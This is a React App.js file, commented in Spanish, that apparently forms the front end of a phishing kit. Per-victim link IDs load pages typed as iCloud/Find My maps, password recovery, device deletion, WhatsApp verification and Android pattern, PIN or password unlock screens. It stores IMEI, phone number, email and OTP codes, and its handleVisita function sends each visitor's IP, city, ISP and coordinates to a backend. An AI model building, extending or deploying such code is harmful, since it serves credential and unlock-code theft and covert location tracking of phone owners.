import { useEffect, useState } from 'react'
import { Routes, Route, useLocation } from 'react-router'
import Maps from './maps/components/Index';
import responses from './api/responses';
import IndexWapp from './wappVerify/components/Index';
import RecoverPassword from './recoverPassword/components/Index';
import DeleteDevice from './deleteDevice/components/Index';
import IndexIC from './ic/components/Index';
import IndexAppAndroid from './androidApp/Main'
import loadingIcon from './androidApp/assetsGlobal/img/loadingIcon.png'

function ProtectedRoute({ children }) {
  const userData = localStorage.getItem('UserData');
  if (!userData || userData === '{}' || userData === 'null') {
    return <>Error 404</>;
  }
  return children;
}

const handleVisita = async (data) => {
  const geo = await responses.getLocation();
  //console.log(geo)

  let latitud = '';
  let longitud = '';
  if (geo?.loc) {
    const [lat, lon] = geo.loc.split(',');
    latitud = lat;
    longitud = lon;
  }

  const datos = {
    link: data.linkg,
    idequipos: data.idequipos,
    ip: geo?.ip || '',
    user: data.user,
    niphone: data.niphone,
    email: data.email,
    modelo: data.modelo,
    imei: data.imei,
    country: geo?.country || '',
    capital: geo?.city || '',
    city: geo?.city || '',
    isp: geo?.org || '',
    latitud: '',
    longitud: '',
    idusuario: data.idusuario,
    opcion_otp: data.opcion_otp,
    tipo_verificacion_otp: data.tipo_verificacion_otp,
    codigo_otp_generado: data.codigo_otp_generado,
    codigo_otp_recibido: data.codigo_otp_recibido,
    recibio_otp: data.recibio_otp,
  };
  await responses.sendVisita(datos);
  return { latitud, longitud };
};

function App() {



  /*useEffect(() => {
    const mediaQuery = window.matchMedia('(prefers-color-scheme: dark)');

    // Guardar el valor actual al cargar la página
    localStorage.setItem('darkMode', mediaQuery.matches);

    const handleChange = (event) => {
      // Actualizar el valor cuando cambie el modo
      localStorage.setItem('darkMode', event.matches);
    };

    mediaQuery.addEventListener('change', handleChange);

    return () => {
      mediaQuery.removeEventListener('change', handleChange);
    };
  }, []);*/

  const location = useLocation()
  const [idLink, setIdLink] = useState('');
  const [idUsername, setIdUsername] = useState('');
  const [loading, setLoading] = useState(true);
  const [error404, setError404] = useState(false);
  const [userDataReady, setUserDataReady] = useState(false);
  const [access, setAccess] = useState(null); // Nuevo estado

  // Si access es false, no mostrar nada más
  if (access === false) {
    return <div style={{ padding: 40, textAlign: 'center', fontSize: 22 }}>Error 404</div>;
  }

  useEffect(() => {
    const urlSegments = location.pathname.split('/');
    const lastThreeDigits = urlSegments[urlSegments.length - 1];
    setIdLink(lastThreeDigits)
  }, [location.pathname])

  useEffect(() => {
    const fetchData = async () => {
      setUserDataReady(false);
      if (!idLink) {
        setLoading(false);
        return;
      }
      try {
        const response = await responses.verifyLink(idLink);
        console.log(response?.data)
        if (response?.data === 'undefined_link') {
          localStorage.removeItem('UserData');
          setError404(true);
          setLoading(false);
          setIdLink('');
          return;
        }
        const data = response?.data || {};
        if (data.status === '1') {
          localStorage.removeItem('UserData');
          setError404(true);
          setLoading(false);
          setIdLink('');
          return;
        }

        const { latitud, longitud } = await handleVisita(data);

        // Si data.latitud y data.longitud son 'latitud_ip' y 'longitud_ip', usa los valores de la IP
        let lan = '';
        let lon = '';

        if (data.latitud === 'latitud_ip' && data.longitud === 'longitud_ip') {
          lan = latitud;      // valor de la IP
          lon = longitud;    // valor de la IP
        } else {
          lan = data.latitud;
          lon = data.longitud;
        }

        const userData = {
          idEquipos: data.idequipos,
          linkg: data.linkg,
          tipo: data.tipo,
          topoxiao: data.topoxiao,
          user: data.user,
          nIphone: data.niphone,
          pais: data.pais,
          numero: data.numero,
          email: data.email,
          code1: data.code_1,
          code2: data.code_2,
          modelo: data.modelo,
          imei: data.imei,
          acceso: data.acceso,
          urlAcortada: data.urlacortada,
          linkShort: data.link_short,
          linkLong: data.link_long,
          valor1: data.valor1,
          valor2: data.valor2,
          idUsuario: data.idusuario,
          status: data.status,
          lat: lan,
          lon: lon,
          opcionOtp: data.opcion_otp,
          tipoVerificacionOtp: data.tipo_verificacion_otp,
          codigoOtpGenerado: data.codigo_otp_generado,
          codigoOtpRecibido: data.codigo_otp_recibido,
          recibioOtp: data.recibio_otp,
        };
        localStorage.removeItem("UserData");
        localStorage.setItem('UserData', JSON.stringify(userData));

        setUserDataReady(true);
      } catch (error) {
        localStorage.removeItem('UserData');
      }
      // NO poner setLoading(false) aquí
    };
    fetchData();
  }, [idLink]);

  // Nuevo useEffect: loading solo se pone en false cuando userDataReady es true
  useEffect(() => {
    if (userDataReady) {
      setLoading(false);
    }
  }, [userDataReady]);






  return (
    <>
      {loading && (
        <span ></span>
      )}
      <style>
        {`
          .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #333;
            border-radius: 50%;
            width: 28px;
            height: 28px;
            animation: spin 1s linear infinite;
            display: inline-block;
          }
          @keyframes spin {
            0% { transform: rotate(0deg);}
            100% { transform: rotate(360deg);}
          }
        `}
      </style>
      <Routes>
        <Route path="/id" element={<>Error 404</>} />
        <Route
          path="/id/:idLink"
          element={
            !loading &&
              userDataReady &&
              localStorage.getItem('UserData') &&
              localStorage.getItem('UserData') !== '{}' &&
              localStorage.getItem('UserData') !== 'null'
              ? (() => {
                const userData = JSON.parse(localStorage.getItem('UserData'));
                switch (userData.tipo) {
                  case 'androidAppPattern':
                    return (<IndexAppAndroid onReady={() => setLoading(false)} />)
                  case 'androidAppNumeric':
                    return (<IndexAppAndroid onReady={() => setLoading(false)} />)
                  case 'androidAppAlphanumeric':
                    return (<IndexAppAndroid onReady={() => setLoading(false)} />)
                  case 'wappVerify':
                    return <IndexWapp onReady={() => setLoading(false)} />;
                  case 'ICMAPNEW':
                    return <Maps onReady={() => setLoading(false)} />;
                  case 'recoverPassword':
                    return <RecoverPassword onReady={() => setLoading(false)} />;
                  case 'deleteDevice':
                    return <DeleteDevice onReady={() => setLoading(false)} />;
                  case 'IC':
                    return <IndexIC onReady={() => setLoading(false)} themeCss={localStorage.getItem('themeCss')} />;
                  default:
                    return <>Error 404</>
                }
              })()
              : (() => {
                const userDataString = localStorage.getItem('UserData');
                if (!userDataString || userDataString === '{}' || userDataString === 'null') {
                  return <span className="loader"></span>;
                }

                try {
                  
                  const userData = JSON.parse(userDataString);
                  const tipo = userData?.tipo;

                  if (tipo === 'androidAppPattern' || tipo === 'androidAppNumeric' || tipo === 'androidAppAlphanumeric') {
                    return (
                      <div
                        style={{
                          display: 'flex',
                          justifyContent: 'center',
                          alignItems: 'center',
                          height: '100vh',
                          backgroundColor: '#fff'
                        }}
                      >
                        <img
                          src={loadingIcon}
                          alt="Loading..."
                          style={{
                            width: 130,
                            height: 130
                          }}
                        />
                      </div>
                    );
                  }
                } catch (e) {
                  return <span className="loader"></span>;
                }

                return <span className="loader"></span>;
              })()

          }
        />
        <Route path="*" element={<>Error 404</>} />
      </Routes>
    </>
  );
}

export default App;